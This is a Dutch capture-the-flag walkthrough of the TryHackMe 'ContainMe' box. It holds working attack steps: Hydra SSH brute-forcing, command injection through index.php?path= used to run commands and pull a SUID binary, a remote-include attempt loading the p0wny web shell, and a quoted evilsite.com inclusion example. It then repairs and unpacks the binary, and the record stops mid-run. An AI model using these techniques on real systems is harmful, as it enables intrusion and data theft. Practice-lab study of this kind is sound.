# ContainMe
## Where am I ? Catch me
Difficulty: Medium
URL: https://tryhackme.com/room/containme1

### Info given

Hack into me and look for the hidden flag. Look beyond the horizon. 
Good luck finding the flag!

### Tasks
- What is the flag?

![alt text](IMAGE.png "Title")

# Content

## Scouting

### Nmap

```
$ sudo nmap -sCV -p- -Pn -v 10.112.181.52

Discovered open port 80/tcp on 10.112.181.52
Discovered open port 22/tcp on 10.112.181.52
Discovered open port 8022/tcp on 10.112.181.52
Discovered open port 2222/tcp on 10.112.181.52

```
Google:
Port 8022 is commonly used as an alternative port for SSH (Secure Shell) remote access (often configured to avoid automated port-22 scanning bots), as well as specific enterprise or media applications.

Google:
Port 2222 is most commonly used as a non-standard alternative for SSH (Secure Shell) remote access and as the default port for the DirectAdmin web hosting control panel.

Nmap:
```
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:1f:89:89:84:0f:fb:d5:ec:81:b3:90:d7:13:6d:e5 (RSA)
|   256 1c:ef:5c:c9:a3:e9:0d:6b:4f:58:15:39:60:f3:f9:19 (ECDSA)
|_  256 ce:5f:0b:6f:f6:98:67:3c:67:0f:9f:73:63:9e:fb:81 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Note: Er draaien twee verschillende SSH versies op; 7.6p1 en 8.2p1.

http://10.112.181.52:80 is de Apache2 Ubuntu Default Page.

### Gobuster

```
$ gobuster dir -u http://10.112.181.52 -w tools/wordlists/Discovery/Web-Content/common.txt

index.html           (Status: 200) [Size: 10918]
index.php            (Status: 200) [Size: 329]
info.php             (Status: 200) [Size: 68949]
```

### info.php

http://10.112.181.52/info.php bevat vanalles, heb ik opgeslagen met SingleFile in File: `phpinfo() (11_14_2026 10：37：18 AM).html`.
PHP Version 7.2.24-0ubuntu0.18.04.8 heeft een hele lijst aan CVEs, sommige met public exploits available: https://www.cybersecurity-help.cz/vdb/soft/php_group/php/7.2.24/

This program makes use of the Zend Scripting Language Engine:
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.24-0ubuntu0.18.04.8, Copyright (c) 1999-2018, by Zend Technologies

|Variable|Value|
|---|---|
|SERVER_SOFTWARE 	|Apache/2.4.29 (Ubuntu) |
|DOCUMENT_ROOT 	|/var/www/html |
|SERVER_ADMIN|webmaster@localhost |
|X-Powered-By |	PHP/7.2.24-0ubuntu0.18.04.8 |
|Calendar support |	enabled |
|include_path|	.:/usr/share/php|
|sendmail_path|	/usr/sbin/sendmail -t -i |
|serialize_precision	|-1|
|variables_order|	GPCS|
|zend.enable_gc|	On	|
|zend.multibyte|	Off	|
|zend.script_encoding|	no value	 |
|zend.signal_check|	Off	|
|ctype functions 	|enabled |
|timelib version 	|2017.09 |
|EXIF Support |	enabled|
|EXIF Version |	7.2.24-0ubuntu0.18.04.8|
|Supported EXIF Version 	|0220 |
|filter.default|	unsafe_raw|
|OpenSSL support 	|enabled|
|OpenSSL Library Version |	OpenSSL 1.1.1 11 Sep 2018 |
|PCRE Library Version 	|8.39 2016-06-14 |
|Phar EXT version |	2.0.2|
|Phar API version |	1.1.1|
|SVN revision |	$Id: f1155e62742ca367e521a3e412667d8ee34eead9 $ |
|Phar Native OpenSSL support| 	enabled |
|$_SERVER['SERVER_ADMIN']|	webmaster@localhost|
|$_SERVER['REMOTE_PORT']	|41564|
|PHP API |	20170718|
|PHP Extension |	20170718|
|Zend Extension |	320170718|
|Zend Extension Build |	API320170718,NTS|
|PHP Extension Build |	API20170718,NTS |

Index.php:
```
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
```
Dus we hebben alles gevonden lijkt het.

**Observatives:**
- server admin is webmaster@localhost
- Er is een phar openssl support, ik denk dat dit die op 8022 is? --> Nee dat is SSL niet SSH.

Er is op 8022 en 22 inderdaad een SSH server te vinden;
```
$ ssh webmaster@10.112.181.52 -p 8022
The authenticity of host '[10.112.181.52]:8022 ([10.112.181.52]:8022)' can't be established.
ED25519 key fingerprint is: SHA256:uylEQrdDe2TIxtxVGHuzLQqsufMXHG6C1wjodq6h85o
This key is not known by any other names.
```
```
$ ssh webmaster@10.112.181.52 -p 22
The authenticity of host '10.112.181.52 (10.112.181.52)' can't be established.
ED25519 key fingerprint is: SHA256:mMbUA2y6p+S0PriDGDheemiz88Jsn8dfextdWlNpZxQ
This key is not known by any other names.
```

### Hydra

Misschien kunnen we wat default wachtwoorden proberen. Dit kan met `hydra`; https://www.kali.org/tools/hydra/

```
$ hydra -l webmaster -P ~/Documents/tryhackme/tools/wordlists/Passwords/Common-Credentials/10k-most-common.txt -t 5 ssh://10.112.181.52:22
*
[DATA] attacking ssh://10.112.181.52:22/
[STATUS] 120.00 tries/min, 120 tries in 00:01h, 9881 to do in 01:23h, 5 active
[STATUS] 123.33 tries/min, 370 tries in 00:03h, 9631 to do in 01:19h, 5 active
[STATUS] 119.71 tries/min, 838 tries in 00:07h, 9163 to do in 01:17h, 5 active
```

```
$ hydra -l webmaster -P ~/Documents/tryhackme/tools/wordlists/Passwords/Common-Credentials/10k-most-common.txt -t 5 ssh://10.112.181.52:8022
*
[DATA] attacking ssh://10.112.181.52:8022/
[STATUS] 123.00 tries/min, 123 tries in 00:01h, 9878 to do in 01:21h, 5 active
[STATUS] 123.33 tries/min, 370 tries in 00:03h, 9631 to do in 01:19h, 5 active
[STATUS] 119.43 tries/min, 836 tries in 00:07h, 9165 to do in 01:17h, 5 active
```
--> Ik denk dat dit niks gaat vinden, maar gewoon laten draaien.


### Ncat op 2222
```
$ ncat 10.112.181.52 2222 -v
Ncat: Version 7.98 ( https://nmap.org/ncat )
Ncat: Connected to 10.112.181.52:2222.
test
cake
waffles
potato
```

--> Het connect wel, maar reageert eigenlijk op niks.

### Uncensored Qwen vragen over info.php
Prompt: "Ik ben bezig met een CTF en heb dit op een server gevonden, is er hier iets wat opvalt voor dit doeleinde?"

Qwen zegt dit:
Grootste hints
1. LXD-container (hostname host1.lxd)
De server draait vrijwel zeker in een LXD/LXC container. Dat is een klassieke CTF-escape-route: check /dev/lxd/sock, lxc config show <container>, gemounte host-dirs, of — als je root wordt in de container en toegang hebt tot de lxd socket — een volledige escape naar de host.

2. Bijna geen disable_functions
Alleen de pcntl_*-functies zijn uitgeschakeld. system, exec, passthru, shell_exec, proc_open staan er niet op, en er is ook geen open_basedir. Zodra je één RCE-vector vindt (upload, LFI, deserialisatie) heb je direct een shell.

3. Streams & wrappers

allow_url_fopen = On, geregistreerd: phar, data, http(s), ftp(s), glob…
Geen curl-extensie → outbound HTTP alleen via streams (SSRF-potentieel via file_get_contents/fopen).
phar:// + phar.readonly = On → deserialisatie-aanval mogelijk als je een phar-bestand op disk kunt krijgen (bijv. via upload).

Samenvattend: de combinatie LXD-container + vrijwel onbeperkte PHP-functies + phar/data-streams is het patroon dat opvalt. Zoek eerst een entry point (upload, include of deserialisatie), en ga daarna richting container-escape.

|Variable|Value|
|---|---|
|Apache Version 	|Apache/2.4.29 (Ubuntu)|
|Apache API Version |	20120211|
|Server Administrator |	webmaster@localhost|
|Hostname:Port| 	host1.lxd:80|
|User/Group 	|www-data(33)/33 |

### Wat is LXD/LXC?

- LXC: Linux Container
- Titel van de CTF is "contain me", klinkt plausibel
- Misschien kunnen we via dat port 2222 en ncat toch proberen te praten met LXC?
```
lxc list                          # containers/instances zien
lxc info <container>              # details, IP, status
lxc config show <container>       # devices, mounts, security.privileged?
lxc exec <container> -- /bin/sh   # shell in de container
lxc image list                    # beschikbare images (belangrijk voor escape!)
```

### Index.php
Machine IP is: 10.112.135.45
Eerder had ik gezien dat gaan naar `index.php` een directory lijst levert, maar dat is NIET een `.php` script, dus daar gaat wat fout. 

Misschien ook zoiets: https://community.owasp.org/attacks/Code_Injection
"
**Example 1**

If an application passes a parameter sent via a GET request to the PHP include() function with no input validation, the attacker may try to execute code other than what the developer had in mind.

The URL below passes a page name to the include() function. http://testsite.com/index.php?page=contact.php

The file “evilcode.php” may contain, for example, the phpinfo() function which is useful for gaining information about the configuration of the environment in which the web service runs. An attacker can ask the application to execute their PHP code using the following request: http://testsite.com/?page=http://evilsite.com/evilcode.php

**Example 2**

When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.

The example below shows a dangerous way to use the eval() function:
```
$myvar = "varname";
$x = $_GET['arg'];
eval("$myvar = $x;");
```
As there is no input validation, the code above is vulnerable to a Code Injection attack.

For example: `/index.php?arg=1; phpinfo()`

While exploiting bugs like these, an attacker may want to execute system commands. In this case, a code injection bug can also be used for command injection, for example: `/index.php?arg=1; system('id')`
"

```
$ wget 10.112.135.45/index.php
<html>
<body>
	<pre>
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

Die comment is interessant. en had ik gemist in de browser. In de source staat het wel, maar het rendert niet want het is een comment.
Deze werkt niet: `http://10.112.135.45/index.php?page=../../../../../`

" An attacker can ask the application to execute their PHP code using the following request: http://testsite.com/?page=http://evilsite.com/evilcode.php"
Kunnen we die pwnieshell aan de praat krijgen?
https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php
> http://10.112.135.45/index.php?page=https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php

--> Nee, het geeft gewoon de index listing

`http://10.112.135.45/index.php?arg=1; phpinfo()`
--> Nee, het geeft gewoon de index listing

Gobuster doen op `http://10.112.135.45/index.php?page=FUZZ`?
> $ gobuster fuzz -u http://10.112.135.45/index.php?path=/FUZZ -w ~/Documents/tryhackme/tools/wordlists/Discovery/Web-Content/combined_directories.txt > gobuster.log
```
[Status=200] [Length=179] [Word=tmp] http://10.112.135.45/index.php?path=%2Ftmp
[Status=200] [Length=6657] [Word=bin] http://10.112.135.45/index.php?path=%2Fbin
[Status=200] [Length=1036] [Word=lib] http://10.112.135.45/index.php?path=%2Flib
[Status=200] [Length=874] [Word=var] http://10.112.135.45/index.php?path=%2Fvar
[Status=200] [Length=1660] [Word=dev] http://10.112.135.45/index.php?path=%2Fdev
[Status=200] [Length=225] [Word=home] http://10.112.135.45/index.php?path=%2Fhome
[Status=200] [Length=179] [Word=media] http://10.112.135.45/index.php?path=%2Fmedia
[Status=200] [Length=8488] [Word=etc] http://10.112.135.45/index.php?path=%2Fetc
[Status=200] [Length=557] [Word=usr] http://10.112.135.45/index.php?path=%2Fusr
[Status=200] [Length=179] [Word=opt] http://10.112.135.45/index.php?path=%2Fopt
[Status=200] [Length=179] [Word=srv] http://10.112.135.45/index.php?path=%2Fsrv
[Status=200] [Length=1970] [Word=run] http://10.112.135.45/index.php?path=%2Frun
[Status=200] [Length=7414] [Word=proc] http://10.112.135.45/index.php?path=%2Fproc
[Status=200] [Length=11087] [Word=sbin] http://10.112.135.45/index.php?path=%2Fsbin
[Status=200] [Length=179] [Word=boot] http://10.112.135.45/index.php?path=%2Fboot
[Status=200] [Length=227] [Word=snap] http://10.112.135.45/index.php?path=%2Fsnap
[Status=200] [Length=179] [Word=mnt] http://10.112.135.45/index.php?path=%2Fmnt
[Status=200] [Length=232] [Word=home page] http://10.112.135.45/index.php?path=%2Fhome+page

```
http://10.112.135.45/index.php?path=/home/mike
```
	total 384K
drwxr-xr-x 5 mike mike 4.0K Jul 30  2021 .
drwxr-xr-x 3 root root 4.0K Jul 19  2021 ..
lrwxrwxrwx 1 root mike    9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3.7K Apr  4  2018 .bashrc
drwx------ 2 mike mike 4.0K Jul 30  2021 .cache
drwx------ 3 mike mike 4.0K Jul 30  2021 .gnupg
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
drwx------ 2 mike mike 4.0K Jul 19  2021 .ssh
-rwxr-xr-x 1 mike mike 351K Jul 30  2021 1cryptupx
```
http://10.112.135.45/index.php?file=/home/mike/lcryptupx
--> Nee

Command injection:
```
$ curl "http://10.112.135.45/index.php?path=;whoami"
<html>
<body>
        <pre>
        total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
www-data
        <pre>

<!--  where is the path ?  -->

</body>
</html>
```
`www-data` is de username
```
$ curl "http://10.112.135.45/index.php?path=;ls%20/"
<html>
<body>
        <pre>
        total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
        <pre>

<!--  where is the path ?  -->

</body>
</html>
```
Zo kunnen we beetje crappy commands uitvoeren op de server als user `www-data`.
URL encoding met cyberchef.

Deze is interessant: 
`-rwxr-xr-x 1 mike mike 351K Jul 30  2021 1cryptupx`
`$ curl "http://10.112.135.45/index.php?path=;cat%20/home/mike/1cryptupx" --output 1cryptupx`
Ik heb er de HTML content uitgehaald, het is een ELF bestand.
```
$ ./1cryptupx 
Segmentation fault         (core dumped) ./1cryptupx
```
We kunnen niet de SSH keys stelen met:
`curl "http://10.112.135.45/index.php?path=;ls%20%2Dla%20/home/mike/%2Essh"`

### 1cryptupx
```$ file 1cryptupx 
1cryptupx: ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)
```
Het is een UPX bestand, "Ultimate Packer for eXecutables"
https://upx.github.io/

unpacken: 
`upx -d packed_file -o unpacked_file`
```
$ ./upx-5.3.0-amd64_linux/upx -d 1cryptupx 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2026
UPX 5.3.0       Markus Oberhumer, Laszlo Molnar & John Reiser   Oct 28th 2026

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: 1cryptupx: NotPackedException: not packed by UPX

Unpacked 0 files.
```
Iets is niet goed gegaan met de curl en de tags eruit halen denk ik.
```strings 1cryptupx
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
```

Misschien dat er nog wat te vinden is hieruit, maar dan moeten we uitzoeken wat er kapot is.

### SUID files zoeken
`find directory -user root -perm -4000 -exec ls -ldb {} \;`
```
$ curl "http://10.112.135.45/index.php?path=;find%20/%20%2Duser%20root%20%2Dperm%20%2D4000%202%3E/dev/null"
<html>
<body>
        <pre>
        total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
/usr/share/man/zh_TW/crypt
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
        <pre>

<!--  where is the path ?  -->

</body>
</html>
```
Dat 1upxcrypt is misschien ingepakte versie van dit ding:
`/usr/share/man/zh_TW/crypt`
`-rwsr-xr-x 1 root root 358668 Jul 30  2021 /usr/share/man/zh_TW/crypt`


```
$ sha1sum crypt
31c949f8b5c09c99d4e8ce6587d3c378424efa2d  crypt
$ ~/Documents/tryhackme/20261114_containme$ sha1sum 1cryptupx
31c949f8b5c09c99d4e8ce6587d3c378424efa2d  1cryptupx
```
--> Ze zijn exact hetzelfde

 curl "http://10.112.138.35/index.php?path=;%2E/usr/share/man/zh%5FTW/crypt"
curl: (52) Empty reply from server

`file /usr/share/man/zh_TW/crypt` geeft niks
`./usr/share/man/zh_TW/crypt` geeft niks

Dit bestand stelen voor lokaal?
`$ curl "http://10.112.138.35/index.php?path=;cat%20/usr/share/man/zh%5FTW/crypt" --output crypt`

### Fix crypt en 1cryptupx


`$ file crypt 
crypt: ELF 64-bit MSB *unknown arch 0x3e00* (SYSV)`
Zelfde probleem als 1cryptupx.
--> Kijken of ik niet de header heb verprutst met dat cat.
Backup maken van `crypt` en `1cryptupx`

```
$ readelf -h crypt
ELF Header:
  Magic:   7f 45 4c 46 02 02 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, big endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              <unknown>: 200
  Machine:                           <unknown>: 0x3e00
  Version:                           0x1000000
  Entry point address:               0xc86c450000000000
  Start of program headers:          4611686018427387904 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               16384 (bytes)
  Size of program headers:           14336 (bytes)
  Number of program headers:         768
  Size of section headers:           16384 (bytes)
  Number of section headers:         0
  Section header string table index: 0
readelf: Warning: The e_phentsize field in the ELF header is larger than the size of an ELF program header
readelf: Error: Reading 11010048 bytes extends past end of file for program headers
```

Dit is probleem: `big endian`, want x86 is little endian.
https://en.wikipedia.org/wiki/Executable_and_Linkable_Format
Volgens wikipedia moeten we offset 0x05 veranderen naar 1 voor little. Rest van de header lijkt oke.

```
$ readelf -h crypt
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x456cc8
  Start of program headers:          64 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         3
  Size of section headers:           64 (bytes)
  Number of section headers:         0
  Section header string table index: 0
```
Het is nu little endian, aangepast met Okteta.
```
$ ./upx-5.3.0-amd64_linux/upx -d crypt
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2026
UPX 5.3.0       Markus Oberhumer, Laszlo Molnar & John Reiser   Oct 28th 2026

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: crypt: NotPackedException: not packed by UPX

Unpacked 0 files.
```
Doet het nog steeds niet, en het segfault nog steeds;
```
$ ./crypt 
Segmentation fault         (core dumped) ./crypt
```

https://github.com/caprinux/uupx
UPX is a widely-used executable packer. Malware authors frequently use UPX to compress their payloads, then tamper with the UPX metadata (magic bytes, checksums, header fields) so that the standard upx -d refuses to unpack the binary. This forces analysts to resort to dynamic unpacking (running the binary in a sandbox and dumping at OEP), which has significant drawbacks.

`git clone git@github.com:caprinux/uupx.git --recurse-submodules`

Netjes met Okteta de HTML eruit slopen:
```
0000:0000 | 3C 68 74 6D  6C 3E 0A 3C  62 6F 64 79  3E 0A 09 3C | <html>.<body>..<
0000:0010 | 70 72 65 3E  0A 09 74 6F  74 61 6C 20  32 38 4B 0A | pre>..total 28K.
0000:0020 | 64 72 77 78  72 2D 78 72  2D 78 20 32  20 72 6F 6F | drwxr-xr-x 2 roo
0000:0030 | 74 20 72 6F  6F 74 20 34  2E 30 4B 20  4A 75 6C 20 | t root 4.0K Jul 
0000:0040 | 31 36 20 20  32 30 32 31  20 2E 0A 64  72 77 78 72 | 16  2021 ..drwxr
0000:0050 | 2D 78 72 2D  78 20 33 20  72 6F 6F 74  20 72 6F 6F | -xr-x 3 root roo
0000:0060 | 74 20 34 2E  30 4B 20 4A  75 6C 20 31  35 20 20 32 | t 4.0K Jul 15  2
0000:0070 | 30 32 31 20  2E 2E 0A 2D  72 77 2D 72  2D 2D 72 2D | 021 ...-rw-r--r-
0000:0080 | 2D 20 31 20  72 6F 6F 74  20 72 6F 6F  74 20 20 31 | - 1 root root  1
0000:0090 | 31 4B 20 4A  75 6C 20 31  35 20 20 32  30 32 31 20 | 1K Jul 15  2021 
0000:00A0 | 69 6E 64 65  78 2E 68 74  6D 6C 0A 2D  72 77 2D 72 | index.html.-rw-r
0000:00B0 | 2D 2D 72 2D  2D 20 31 20  72 6F 6F 74  20 72 6F 6F | --r-- 1 root roo
0000:00C0 | 74 20 20 31  35 34 20 4A  75 6C 20 31  36 20 20 32 | t  154 Jul 16  2
0000:00D0 | 30 32 31 20  69 6E 64 65  78 2E 70 68  70 0A 2D 72 | 021 index.php.-r
0000:00E0 | 77 2D 72 2D  2D 72 2D 2D  20 31 20 72  6F 6F 74 20 | w-r--r-- 1 root 
0000:00F0 | 72 6F 6F 74  20 20 20 32  30 20 4A 75  6C 20 31 35 | root   20 Jul 15
0000:0100 | 20 20 32 30  32 31 20 69  6E 66 6F 2E  70 68 70 0A |   2021 info.php.
0000:0110 | 7F 45 4C 46  02 02 01 00  00 00 00 00  00 00 00 00 | .ELF............
0000:0120 | 02 00 3E 00  01 00 00 00  C8 6C 45 00  00 00 00 00 | ..>.....ÈlE.....
0000:0130 | 40 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 | @...............
0000:0140 | 00 00 00 00  40 00 38 00  03 00 40 00  00 00 00 00 | ....@.8...@.....

```

Het moet beginnen met `0x7F 'E' 'L' 'F'` en we moeten die endianness fixen
```
0000:0000 | 7F 45 4C 46  02 01 01 00  00 00 00 00  00 00 00 00 | .ELF............
0000:0010 | 02 00 3E 00  01 00 00 00  C8 6C 45 00  00 00 00 00 | ..>.....ÈlE.....
0000:0020 | 40 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 | @...............
0000:0030 | 00 00 00 00  40 00 38 00  03 00 40 00  00 00 00 00 | ....@.8...@.....
0000:0040 | 01 00 00 00  05 00 00 00  00 00 00 00  00 00 00 00 | ................
```

Op het einde van de file zien we dit:
```
0005:78B0 | 2F 36 D7 7F  60 4B 4E 28  FF 2D 76 C1  45 EB 7F 30 | /6×.`KN(ÿ-vÁEë.0
0005:78C0 | 2F 81 2D 98  86 7F 27 7F  0F A6 DB 54  81 03 AF 97 | /.-...'..¦ÛT..¯.
0005:78D0 | 7F F4 FF 92  24 09 8B 00  00 2A 49 FF  00 00 00 00 | .ôÿ.$....*Iÿ....
0005:78E0 | 55 50 58 21  00 00 00 00  55 50 58 21  0D 16 08 09 | UPX!....UPX!....
0005:78F0 | 6E 14 E6 78  C6 22 2C C7  60 07 00 00  42 02 00 00 | n.æxÆ",Ç`...B...
0005:7900 | D0 A9 0D 00  49 1B 00 A2  F4 00 00 00  09 3C 70 72 | Ð©..I..¢ô....<pr
0005:7910 | 65 3E 0A 0A  3C 21 2D 2D  20 20 77 68  65 72 65 20 | e>..<!--  where 
0005:7920 | 69 73 20 74  68 65 20 70  61 74 68 20  3F 20 20 2D | is the path ?  -
0005:7930 | 2D 3E 0A 0A  3C 2F 62 6F  64 79 3E 0A  3C 2F 68 74 | ->..</body>.</ht
0005:7940 | 6D 6C 3E 0A  0A                                    | ml>..           
```

Einde maakt blijkbaar niet uit;
```
~/Documents/tryhackme/tools/uupx/build/release/upx 1cryptupx_edit_okteta --force-unpack -d -o crypt.unpacked
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2026
UPX git-d69b70  Markus Oberhumer, Laszlo Molnar & John Reiser    Mar 6th 2026

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: WARNING: entry point does not match any known UPX stub signature;
upx:          proceeding with --force-unpack anyway
[WARNING] bad b_info at 0x57644

[WARNING] ... recovery at 0x57640

    895440 <-    358725   40.06%   linux/amd64   crypt.unpacked

Unpacked 1 file.

WARNING: this is an unstable beta version - use for testing only! Really.
```

Dit geeft `crypt.unpacked` omg oke tijd voor pauze. 

### Investigating crypt.unpacked
```
$ ./crypt.unpacked 
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

```
```
$ file crypt.unpacked 
crypt.unpacked: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=6dc3ad217b2c99198f8565e1a72c41e99eb5f4dd, for GNU/Linux 3.2.0, stripped
```
```
$ strings crypt.unpacked
yescryptH9
DST not allowed in SUID/SGID programs
Genu
ntel
ineI
Auth
cAMD
enti
hprOBnaeloheSredDyrctbuo
UUUUUUUUUUUUUUUU../lib/crypt-common.c
dst != NULL
src != NULL
d_size >= s_size + 1
_crypt_strcpy_or_abort
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
0123456789abcdef
$sha1$
%.*s%s%lu
%s%lu$%.*s$
$sha1$%u$
../lib/crypt-pbkdf1-sha1.c
n >= 1 && (size_t)n + 2 < o_size
_crypt_gensalt_sha1crypt_rn
%s%zu$
rounds=
rounds=
rounds=
%s,rounds=%lu$
To be, or not to be,--that is the question:--
Whether 'tis nobler in the mind to suffer
The slings and arrows of outrageous fortune
Or to take arms against a sea of troubles,
And by opposing end them?--To die,--to sleep,--
No more; and by a sleep to say we end
The heartache, and the thousand natural shocks
That flesh is heir to,--'tis a consummation
Devoutly to be wish'd. To die,--to sleep;--
To sleep! perchance to dream:--ay, there's the rub;
For in that sleep of death what dreams may come,
When we have shuffled off this mortal coil,
Must give us pause: there's the respect
That makes calamity of so long life;
For who would bear the whips and scorns of time,
The oppressor's wrong, the proud man's contumely,
The pangs of despis'd love, the law's delay,
The insolence of office, and the spurns
That patient merit of the unworthy takes,
When he himself might his quietus make
With a bare bodkin? who would these fardels bear,
To grunt and sweat under a weary life,
But that the dread of something after death,--
The undiscover'd country, from whose bourn
No traveller returns,--puzzles the will,
And makes us rather bear those ills we have
Than fly to others that we know not of?
Thus conscience does make cowards of us all;
And thus the native hue of resolution
Is sicklied o'er with the pale cast of thought;
And enterprises of great pith and moment,
With this regard, their currents turn awry,
And lose the name of action.--Soft you now!
The fair Ophelia!--Nymph, in thy orisons
Be all my sins remember'd.
../lib/alg-gost3411-2012-hmac.c
n >= GOSTR3411_2012_L && n <= GOSTR3411_2012_B
_crypt_gost_hmac256
6666666666666666\\\\\\\\\\\\\\\\
../lib/alg-sha256.c
dkLen <= 32 * (size_t)(UINT32_MAX)
_crypt_PBKDF2_SHA256
!"#$%@@@@@@&'()*+,-./0123456789:;<=>?../lib/alg-yescrypt-opt.c
ctx != NULL
yescrypt-prehash
Client Key
yescrypt-ROMhash
blockmix_xor_save
blockmix_xor
blockmix
$%c$rounds=%lu$
../lib/crypt-gensalt.c
written + 5 < output_size
_crypt_gensalt_sha_rn
```

```
$ ./crypt.unpacked "horse"
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
